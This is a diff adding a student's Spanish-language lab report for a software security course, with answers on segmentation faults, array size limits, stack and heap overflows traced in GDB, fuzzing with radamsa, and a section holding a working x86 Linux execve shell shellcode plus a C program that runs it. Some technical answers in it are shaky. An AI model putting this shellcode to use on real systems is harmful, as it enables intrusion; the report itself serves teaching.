@@ -1,0 +1,99 @@
+Ejecución recursiva infinita
+¿A qué se corresponde el término SIGSEGV y quién lo ha invocado?
+Esta señal la envía el sistema operativo a un cierto proceso cuando éste intenta acceder a una posición de memoria que no le corresponde. Está asociado al mensaje "Violación de segmento" generalmente provocado por errores en la programación.
+
+Bucle Anderson
+¿Cuál es el fallo de este código?
+La expresión i * 0 es equivalente a (i * 0) != 0 que se evalua como false y va siempre a la otra rama donde esta el break y se sale del bucle.
+¿Qué tipo de vulnerabilidad es (de las vistas en clase)?
+Lógica del programa
+(OPCIONAL) ¿En qué consistió el fallo cometido en Microsoft Access?
+Anderson creo un modal box que no tenía botón de cancelar ni aceptar.
+
+Variables demasiado grandes
+-¿Cuál es el tamaño en bytes que se reserva para la variable xxxl?
+8*1000000000 = 7,6 GB
+En sistemas de 32 bits un puntero puede referenciar hasta 2^32 bytes = 4GB. Estos se dividen en 2GB para código y 2GB para datos. El espacio reservado para código se divide en 1GB para el kernel y 1GB para tus programas. Con lo cual, se tienen 2GB para datos en tu programa.
+¿Cuál es el tamaño máximo que se permite para la variable xxxl?
+268435424. Multiplicando por 8 para saber los bytes y dividiendo por 1024 tres veces para llegar a cuantos gigabytes ocupa. Esto es alrededor de 2GB.
+¿Cuál es el tamaño máximo que se permite para la variable xxxl si se emplearan
+otros tipos de datos (short, int, long double)?
+Para calcular el tamaño máximo de un array de short, hay que multiplicar el tamaño del array de double por cuatro ya que un double(8bytes) ocupa cuatro veces más que un short (2Bytes). Esto es 1073741696.
+Para calcular el tamaño máximo de un array de ints, hay que multiplicar el tamaño del array de double por dos ya que un double(8bytes) ocupa el doble de un int(4Bytes). Esto es 536870848.
+Para calcular el tamaño máximo de un array de long double, hay que dividir el tamaño del array de double por 1,5 ya que un double(8bytes) ocupa 1,5 veces menos que un long double(12Bytes en mi caso). Esto es 178956949.
+
+Desbordamiento de montículo
+¿Por qué el programa no devuelve fallo?
+Porque C no tiene protección de acceso y sobreescritura a zonas de memoria contiguas.
+
+Desbordamiento de pila al detalle
+¿Cuál es el tamaño máximo del buffer?
+4 bytes
+¿Cuántos veces se puede introducir “A” sin que falle el programa? ¿Es diferente al valor anterior? ¿Por qué?
+11 As. Si, porque el tamaño de la pila de llamadas máximo es 0xc, es decir, de R0-R3.
+¿Cómo se calcula la dirección efectiva para guardar los datos en el buffer (instrucción lea)?
+0x080482d3 <+19>:    lea    -0xc(%ebp),%eax
+GDB sin desbordamiento
+gdb buffer
+break main
+r
+s
+s 
+enter 
+AAA
+x/x $esp(Dirección de esp)
+x/s $ebp(Dirección de ebp)
+x/s $ebp-12 (Contenido de buffer): AAA
+GDB con desbordamiento
+r
+s
+s 
+enter 
+AAAAAAAAAAAAAA
+x/x $esp(Dirección de esp)
+x/s $ebp(Dirección de ebp)
+x/s $ebp-12 (Contenido de buffer): 14 As
+x/s $ebp: "AA"
+Si no hubiera desbordamiento de pila en EBP no debería haber nada escrito. Con lo cual, hay un desbordamiento de la pila de llamadas.
+Aparte de ser un desbordamiento de pila, este tipo de agujero responde a otro de los tipos visto en clase, ¿cuál es?
+Validación de la entrada de datos
+
+Fuzzing de aplicaciones
+1. Ejecutar echo “1 + (2 + (3 + 4))” | radamsa --seed 12 -n 4.
+-Ejecutar el comando varias veces y probar con varias semillas. ¿Por qué es importante que los resultados sean los mismos con la misma semilla? 
+Porque son el mismo tipo de prueba solo cambiando el numero de casos
+2. Someter a prueba a la calculadora de la terminal (bc). Se piden 1000 experimentos con variaciones de la entrada "100 * (1 + (2 / 3))".
+echo "100 * (1 + (2 / 3))" | radamsa -n 1000 | bc
+¿Se puede concluir que bc es robusto?
+Sí, ya que no devuelve ninguna vulnerabilidad que se pueda aprovechar en el fuzzing.
+3. Crear un archivo comprimido de la siguiente manera: gzip -c
+/bin/bash > archivo.gz.
+4. Someter a prueba gzip: while true; do radamsa archivo.gz | gzip -d > /dev/null; done
+¿Los errores mostrados por gzip indican que el programa en sí tiene fallos?
+No, solo indican que el fichero que le has pasado tiene un formato que no es reconocido.
+
+Uso de shellcode
+1. Comprobar la traducción a instrucciones en ensamblador con el
+siguiente comando perteneciente al Netwide Assembler (NASM): echo
+–ne “shellcode” | ndisasm -u -.
+2. Equipar el shellcode en un programa en C para poderlo utilizar.
+shellcode.c:
+#include <stdio.h>
+#include <string.h>
+ 
+char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
+		  "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
+
+int main(void)
+{
+fprintf(stdout,"Length: %d\n",strlen(shellcode));
+(*(void(*)()) shellcode)();
+return 0;
+}
+3. Compilar (ignorar el warning) y ejecutar el programa.
+gcc -o shell shellcode.c
+¿Cómo se sabe que ha funcionado?
+Al ejecutar el ejecutable te abre una terminal
+¿En qué situaciones/programas se podría inyectar este shellcode ?
+- virus para controlar windows
+- necesidad desbordar la pila para obtener un dato
